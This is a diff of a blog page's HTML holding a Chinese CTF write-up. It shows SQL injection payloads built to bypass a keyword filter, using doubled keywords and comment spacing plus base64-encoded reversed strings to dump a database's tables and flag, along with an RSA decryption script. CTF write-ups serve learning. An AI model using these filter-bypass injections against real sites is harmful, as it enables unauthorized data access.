@@ -39,7 +39,7 @@
 <meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/8.jpg">
 <meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/9.jpg">
 <meta property="og:image" content="http://www.cryscat.com/2019/04/01/嘉韦斯杯Writeup/10.jpg">
-<meta property="og:updated_time" content="2019-04-01T16:36:42.886Z">
+<meta property="og:updated_time" content="2019-04-03T15:45:17.678Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="嘉韦斯杯Writeup">
 <meta name="twitter:description" content="壹一道SQL注入题，直接上sqlmap跑 贰打开链接，主页是一长串字符，base64解密，解出来是一段JSfuck编码，直接丢进浏览器的控制台，出flag 叁主页是一串十六进制的运算式，题目说要我们2秒内计算出结果并提交，所以这一题要靠脚本解决（正则表达式不会写，在正则表达式网站试了试，得出了能将式子全都提取出来的正则表达式，之后再进行一个式子截取，去掉其他无关字符）脚本：12345678910">
@@ -215,20 +215,20 @@
 <h1 id="柒"><a href="#柒" class="headerlink" title="柒"></a>柒</h1><p>又是一道SQL注入题，这题鼓捣了好久！</p>
 <p>经过测试发现id=后面是以base64加密逆序输入的，过滤了<code>or</code>、<code>=</code>、<code>”</code>、<code>&#39;</code>、<code>union</code>、<code>select</code>，并且不需要闭合引号</p>
 <blockquote>
-<p>爆库：<br>0/<strong>/uunionnion/</strong>/selselectect/**/1,2,3,4,5,database()#<br>=MSKoU2chJWY0FGZsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM</p>
+<p>爆库：<br>0/**/uunionnion/**/selselectect/**/1,2,3,4,5,database()#<br>=MSKoU2chJWY0FGZsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM</p>
 </blockquote>
 <blockquote>
-<p>爆表：<br>0/<strong>/uunionnion/</strong>/selselectect/<strong>/1,2,3,4,5,table_name/</strong>/from/<strong>/infoorrmation_schema.tables/</strong>/where/<strong>/table_schema/</strong>/like/**/database()#<br>=owIpgSZzFmYhRXYk9iKq8SZrlGbvoiKvEWblh2Yz9VZsJWY09iKq8SZyVGa39iKq8yclxmYhRnLh1WZoN2cf52bpRXYtJncv9mZul2LqoyLt9mcm9iKq8SZtFmbfVGbiFGdsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM</p>
+<p>爆表：<br>0/**/uunionnion/**/selselectect/**/1,2,3,4,5,table_name/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database()#<br>=owIpgSZzFmYhRXYk9iKq8SZrlGbvoiKvEWblh2Yz9VZsJWY09iKq8SZyVGa39iKq8yclxmYhRnLh1WZoN2cf52bpRXYtJncv9mZul2LqoyLt9mcm9iKq8SZtFmbfVGbiFGdsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM</p>
 </blockquote>
 <blockquote>
-<p>爆列：<br>0/<strong>/uunionnion/</strong>/selselectect/<strong>/1,2,3,4,5,column_name/</strong>/from/<strong>/infoorrmation_schema.columns/</strong>/where/<strong>/table_name/</strong>/like/**/0x666C6167 #<br>=MCI3YTM2MkN2YDew8iKq8SZrlGbvoiKvUWbh52XlxmYhR3LqoyLlJXZod3LqoyLz5Wb1x2bj5SYtVGajN3Xu9Wa0FWbyJ3bvZmbp9iKq8SbvJnZvoiKvUWbh52Xu1Wds92YsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM</p>
+<p>爆列：<br>0/**/uunionnion/**/selselectect/**/1,2,3,4,5,column_name/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666C6167 #<br>=MCI3YTM2MkN2YDew8iKq8SZrlGbvoiKvUWbh52XlxmYhR3LqoyLlJXZod3LqoyLz5Wb1x2bj5SYtVGajN3Xu9Wa0FWbyJ3bvZmbp9iKq8SbvJnZvoiKvUWbh52Xu1Wds92YsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM</p>
 </blockquote>
 <blockquote>
-<p>最后payload：<br>0/<strong>/uniunionon/</strong>/seselectlect/<strong>/1,2,3,4,5,flag/</strong>/from/**/flag#<br>jcWYsZ2LqoyLt9mcm9iKq8yZhxmZsUDL0wyMsIDLx8iKq8CdjVGb0NWZsV2clN3LqoyLu9mbvlmb1lmb19iKq8CM</p>
+<p>最后payload：<br>0/**/uniunionon/**/seselectlect/**/1,2,3,4,5,flag/**/from/**/flag#<br>jcWYsZ2LqoyLt9mcm9iKq8yZhxmZsUDL0wyMsIDLx8iKq8CdjVGb0NWZsV2clN3LqoyLu9mbvlmb1lmb19iKq8CM</p>
 </blockquote>
 <img src="/2019/04/01/嘉韦斯杯Writeup/4.jpg">
 <h1 id="捌"><a href="#捌" class="headerlink" title="捌"></a>捌</h1><p>上Kali的openssl，其中e就是exponent的值，转成十进制：<br><img src="/2019/04/01/嘉韦斯杯Writeup/5.jpg"></p>
-<p>将解出的这串数字进行因式分解（<a href="http://factordb.com）" target="_blank" rel="noopener">http://factordb.com）</a><br><img src="/2019/04/01/嘉韦斯杯Writeup/6.jpg"></p>
+<p>将解出的这串数字进行因式分解<br><a href="http://factordb.com" target="_blank" rel="noopener">http://factordb.com</a><br><img src="/2019/04/01/嘉韦斯杯Writeup/6.jpg"></p>
 <p>最后用python脚本进行解密：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> gmpy </span><br><span class="line"><span class="keyword">import</span> rsa </span><br><span class="line">p = <span class="number">273821108020968288372911424519201044333</span></span><br><span class="line">q = <span class="number">280385007186315115828483000867559983517</span></span><br><span class="line">n = <span class="number">76775333340223961139427050707840417811156978085146970312315886671546666259161</span></span><br><span class="line">e = <span class="number">65537</span> </span><br><span class="line">d = int(gmpy.invert(e , (p<span class="number">-1</span>) * (q<span class="number">-1</span>))) </span><br><span class="line">privatekey = rsa.PrivateKey(n , e , d , p , q)      <span class="comment">#根据已知参数，计算私钥 </span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"fllllllag.txt"</span> , <span class="string">"rb"</span>) <span class="keyword">as</span> f: </span><br><span class="line">    print(rsa.decrypt(f.read(), privatekey).decode())   <span class="comment">#使用私钥对密文进行解密，并打印</span></span><br></pre></td></tr></table></figure></p>
 <img src="/2019/04/01/嘉韦斯杯Writeup/7.jpg">
 <h1 id="玖"><a href="#玖" class="headerlink" title="玖"></a>玖</h1><p>seacms</p>
